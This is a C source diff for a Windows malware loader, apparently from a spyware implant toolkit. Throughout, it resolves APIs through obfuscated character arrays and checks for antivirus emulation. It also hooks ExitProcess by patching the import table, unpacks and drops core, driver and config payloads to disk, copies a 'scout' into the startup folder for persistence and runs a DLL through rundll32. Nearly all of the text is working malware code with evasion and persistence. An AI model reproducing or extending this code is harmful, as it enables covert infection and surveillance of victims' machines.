@@ -113,6 +113,7 @@ endmagicloop:
 	CHAR strGetShortPathNameW[] = { 'G', 'e', 't', 'S', 'h', 'o', 'r', 't', 'P', 'a', 't', 'h', 'N', 'a', 'm', 'e', 'W', 0x0 };
 	CHAR strPathAddBackslashW[] = { 'P', 'a', 't', 'h', 'A', 'd', 'd', 'B', 'a', 'c', 'k', 's', 'l', 'a', 's', 'h', 'W', 0x0 };
 	CHAR strPathAppendW[] = { 'P', 'a', 't', 'h', 'A', 'p', 'p', 'e', 'n', 'd', 'W', 0x0 };
+	CHAR strExitThread[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
 
 	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualAlloc);
 	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualFree);
@@ -167,7 +168,6 @@ endmagicloop:
 	pData->header = header;
 	// *** Resolve API END
 
-
 	// *** Check for Microsoft Security Essential emulation 
 	LPSTR fName = (LPSTR)pData->VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
 	pData->GetModuleFileNameA(NULL, fName, MAX_PATH);
@@ -188,20 +188,26 @@ endmagicloop:
 	// FIX INSTALLERS & STUFF
 	FixInstallers(pData);
 	//
-
+	
 	// *** Hook ExitProcess the lame way
+
 	ULONG uOldProtect;
+
 	MEMORY_BASIC_INFORMATION mbi;
 	ULONG uHookAddress = (ULONG)((PBYTE)header + header->functions.exitProcessHook.offset);
-	PBYTE pExitProcessAddr = (PBYTE)pData->GetProcAddress(pData->LoadLibraryA(strKernel32), strExitProcess); 
+	LPVOID pBaseAddress = pData->GetModuleHandleA(NULL);
+	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddress;
+	PIMAGE_NT_HEADERS32 pNtHeaders = (PIMAGE_NT_HEADERS32) (((PBYTE)pDosHeader) + pDosHeader->e_lfanew);
 
-	pData->VirtualQuery((PVOID)pExitProcessAddr, &mbi, sizeof(MEMORY_BASIC_INFORMATION));
-	pData->VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &uOldProtect);
+	HOOKIAT pfn_HookIAT = (HOOKIAT) (((PCHAR)header) + header->functions.hookIAT.offset);
+	pfn_HookIAT(strKernel32,
+		strExitProcess, 
+		//(DWORD)pExitProcessAddr, 
+		(DWORD)uHookAddress,
+		pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
+		(DWORD)pBaseAddress,
+		pData);
 
-	pExitProcessAddr[0] = 0xe9;
-	*(PULONG)(pExitProcessAddr + 1) = (ULONG)uHookAddress - ((ULONG)pExitProcessAddr + 5); // FIXME
-
-	pfn_VirtualProtect(mbi.BaseAddress, mbi.RegionSize, uOldProtect, &uOldProtect);
 		
 	// this is used to notify the ExitProcess hook that we can exit the process,
 	// so it must be writable
@@ -221,7 +227,7 @@ endmagicloop:
 
 		PBYTE pScoutBuffer = (PBYTE) pData->VirtualAlloc(NULL, header->files.core.original_size, MEM_COMMIT, PAGE_READWRITE);
 		if (aP_depack(pPackedScoutBuffer, pScoutBuffer) != header->files.core.original_size)
-			goto OEP_CALL;
+			goto OEP_RESTORE;
 		pData->VirtualFree(pPackedScoutBuffer, 0, MEM_RELEASE);
 
 		// ** save buffer & size
@@ -255,7 +261,7 @@ endmagicloop:
 				if (pData->GetLastError() != ERROR_ALREADY_EXISTS) // non-sense but.. whatever.
 				{
 					pData->VirtualFree(pTmpDir, 0, MEM_RELEASE);
-					goto OEP_CALL;
+					goto OEP_RESTORE;
 				}
 		}
 
@@ -270,7 +276,7 @@ endmagicloop:
 			if (pData->GetLastError() != ERROR_ALREADY_EXISTS)
 			{
 				pData->VirtualFree(pTmpDir, 0, MEM_RELEASE);
-				goto OEP_CALL;
+				goto OEP_RESTORE;
 			}
 		}
 
@@ -292,8 +298,10 @@ endmagicloop:
 
 			BOOL ret = pfn_DumpFile(fileName, (PCHAR)fileData, size, originalSize, pData);
 			if (ret == FALSE)
-				goto OEP_CALL;
+				goto OEP_RESTORE;
 		}
+		else
+			goto OEP_RESTORE;
 
 		// CORE (64 bit)
 		if (header->files.core64.offset != 0 && header->files.core64.size != 0)
@@ -304,8 +312,6 @@ endmagicloop:
 			DWORD originalSize = header->files.core64.original_size;
 
 			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
-			if (ret == FALSE)
-				goto OEP_CALL;
 		}
 
 		// CONFIG
@@ -318,7 +324,7 @@ endmagicloop:
 
 			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
 			if (ret == FALSE)
-				goto OEP_CALL;
+				goto OEP_RESTORE;
 		}
 
 		// DRIVER
@@ -330,8 +336,6 @@ endmagicloop:
 			DWORD originalSize = header->files.driver.original_size;
 
 			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
-			if (ret == FALSE)
-				goto OEP_CALL;
 		}
 
 		// DRIVER (64 bit)
@@ -343,8 +347,6 @@ endmagicloop:
 			DWORD originalSize = header->files.driver64.original_size;
 
 			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
-			if (ret == FALSE)
-				goto OEP_CALL;
 		}
 
 		// CODEC
@@ -356,10 +358,9 @@ endmagicloop:
 			DWORD originalSize = header->files.codec.original_size;
 
 			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
-			if (ret == FALSE)
-				goto OEP_CALL;
 		}
 
+/*
 		// BITMAP(DEMO)
 		if (header->files.bitmap.offset != 0 && header->files.bitmap.size != 0)
 		{
@@ -369,16 +370,17 @@ endmagicloop:
 			DWORD originalSize = header->files.bitmap.original_size;
 
 			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
-			if (ret == FALSE)
-				goto OEP_CALL;
 		}
+*/
 
 		DWORD oldProtect;
 		THREADPROC pfn_CoreThreadProc = (THREADPROC)(((char*)header) + header->functions.coreThread.offset); 
 		pData->VirtualProtect(pfn_CoreThreadProc, (UINT_PTR)CoreThreadProc_End - (UINT_PTR)CoreThreadProc, PAGE_EXECUTE_READWRITE, &oldProtect);
+
 		pfn_CreateThread(NULL, 0, pfn_CoreThreadProc, pData, 0, NULL);
 	}
 
+OEP_RESTORE:
 	// *** restore the original code
 	if (header->stage1.size) 
 	{
@@ -465,6 +467,9 @@ LPVOID WINAPI MemoryLoader(LPVOID pDataBuffer)
 	// questo comunica allo scout che sta girando in un meltato e gli passa
 	// un puntatore a synchro che viene usata dalla hook di ExitProcess per sapere
 	// quando si puo' uscire
+	MAIN ptrMain = (MAIN)CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint); // greetz to cod and busatt.
+	
+	ptrMain((HINSTANCE)0xf1c4babe, NULL, "", 0xa);
 	PWCHAR pScoutName = MyConf(&pData->header->synchro);	
 
 	// drop scout into startup folder
@@ -495,7 +500,7 @@ LPVOID WINAPI MemoryLoader(LPVOID pDataBuffer)
 	pData->VirtualFree(pStartupPath, 0, MEM_RELEASE);
 	
 	// MAIN MAIN
-	MAIN ptrMain = (MAIN)CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
+	
 	ptrMain((HINSTANCE)lpAddress, NULL, "", 0xa);
 
 
@@ -504,6 +509,7 @@ LPVOID WINAPI MemoryLoader(LPVOID pDataBuffer)
 }
 FUNCTION_END(MemoryLoader);
 
+/*
 __forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader, PMY_DATA pData)
 {
 	DWORD dwIatSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
@@ -543,6 +549,46 @@ __forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeade
 				pImportLookupTable++;		
 			}
 		pImportDescriptor++;
+	}
+}
+*/
+__forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader, PMY_DATA pData)
+{
+	DWORD dwIatSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
+	DWORD dwIatAddr = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+
+	// no import directory here!
+	if (dwIatAddr == 0)
+		return;
+
+	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = CALC_OFFSET(PIMAGE_IMPORT_DESCRIPTOR, pModule, dwIatAddr);
+
+	while(pImportDescriptor->Characteristics != 0)
+	{
+		LPDWORD pImportLookupTable = CALC_OFFSET(LPDWORD, pModule, pImportDescriptor->Characteristics);
+		LPDWORD pIATRVA = CALC_OFFSET(LPDWORD, pModule,	pImportDescriptor->FirstThunk);
+
+		LPCSTR lpModName = CALC_OFFSET(LPCSTR, pModule,	pImportDescriptor->Name);
+
+		HMODULE hMod = pData->LoadLibraryA(lpModName);
+
+		if (hMod != NULL)
+			while(*pImportLookupTable != 0x00)
+			{
+				if ((*pImportLookupTable & IMAGE_ORDINAL_FLAG) != 0x00)
+				{
+					DWORD pOrdinalValue = *pImportLookupTable & 0x0ffff;
+					*pIATRVA = (DWORD) pData->GetProcAddress(hMod, (LPCSTR) pOrdinalValue);
+				}
+				else
+				{
+					LPCSTR lpProcName = CALC_OFFSET_DISP(LPCSTR, pModule, (*pImportLookupTable), 2);    // adding two bytes
+					*pIATRVA = (DWORD) pData->GetProcAddress(hMod, lpProcName);
+				}
+				pIATRVA++;
+				pImportLookupTable++;        
+			}
+			pImportDescriptor++;
 	}
 }
 
@@ -702,16 +748,20 @@ DWORD WINAPI CoreThreadProc(__in PMY_DATA pData)
 
 	CHAR strRunDLL[] = { '%', 's', 'y', 's', 't', 'e', 'm', 'r', 'o', 'o', 't', '%', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'r', 'u', 'n', 'd', 'l', 'l', '3', '2', '.', 'e', 'x', 'e', ' ', '"', 0x0 };
 	CHAR strComma[] = { '"', ',', 0x0 };
-	CHAR strSuffix5[] = { '5', 0x0 };
-	CHAR strSuffix8[] = { '8', 0x0 };
 
+	CHAR strHFF5[11];
+	CHAR strHFF8[11];
+	_MEMSET_(strHFF5, 0x0, 11);
+	_MEMSET_(strHFF8, 0x0, 11);
+	_MEMCPY_(strHFF5, pData->header->eliteExports, 10);
+	_MEMCPY_(strHFF8, pData->header->eliteExports+11, 10);
+	
 	pCompletePath = (PCHAR)pData->VirtualAlloc(NULL, 32767, MEM_COMMIT, PAGE_READWRITE);
 	_MEMSET_(pCompletePath, 0x0, 32767);
 	_MEMCPY_(pCompletePath, strRunDLL, _STRLEN_(strRunDLL));
 	_STRCAT_(pCompletePath, pData->header->dllPath);
 	_STRCAT_(pCompletePath, strComma);
-	_STRCAT_(pCompletePath, pData->header->fPrefix);
-	_STRCAT_(pCompletePath, strSuffix8);
+	_STRCAT_(pCompletePath, strHFF8);
 
 	HMODULE hLib = pData->LoadLibraryA(pData->header->dllPath);
 	if (hLib == INVALID_HANDLE_VALUE)
@@ -719,8 +769,7 @@ DWORD WINAPI CoreThreadProc(__in PMY_DATA pData)
 
 	pFunctionName = (PCHAR)pData->VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
 	_MEMSET_(pFunctionName, 0x0, 4096);
-	_MEMCPY_(pFunctionName, pData->header->fPrefix, _STRLEN_(pData->header->fPrefix));
-	_STRCAT_(pFunctionName, strSuffix5);
+	_MEMCPY_(pFunctionName, strHFF5, _STRLEN_(strHFF5));
 	
 	HFF5 pfn_HFF5 = (HFF5) pData->GetProcAddress(hLib, pFunctionName);
 	if (pfn_HFF5 == NULL)
@@ -819,14 +868,16 @@ DWORD HookIAT(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD ima
 	// function address we're going to hook
 	DWORD needAddress = (DWORD)pData->GetProcAddress(modHandle, name);
 	IMAGE_IMPORT_DESCRIPTOR const * lpImp = (IMAGE_IMPORT_DESCRIPTOR *)((UINT_PTR)imageBase + IAT_rva);
-	while(lpImp->Name) {
+	while(lpImp->Name) 
+	{
 		CHAR* dllName_RO = (CHAR*)((UINT_PTR)imageBase) + lpImp->Name;
 		CHAR* dllName = (CHAR*) pData->VirtualAlloc(NULL, _STRLEN_(dllName_RO) + 1, MEM_COMMIT, PAGE_READWRITE);
 		if(dllName == NULL)
 			return -1;
 
 		_MEMCPY_(dllName, dllName_RO, _STRLEN_(dllName_RO) + 1);
-		if(!_STRCMPI_(dllName, dll)) {
+		if(!_STRCMPI_(dllName, dll)) 
+		{
 			UINT_PTR dwOriginalThunk = (lpImp->OriginalFirstThunk ? lpImp->OriginalFirstThunk : lpImp->FirstThunk);
 			IMAGE_THUNK_DATA const *itd = (IMAGE_THUNK_DATA *)(imageBase + dwOriginalThunk);
 			UINT_PTR dwThunk = lpImp->FirstThunk;
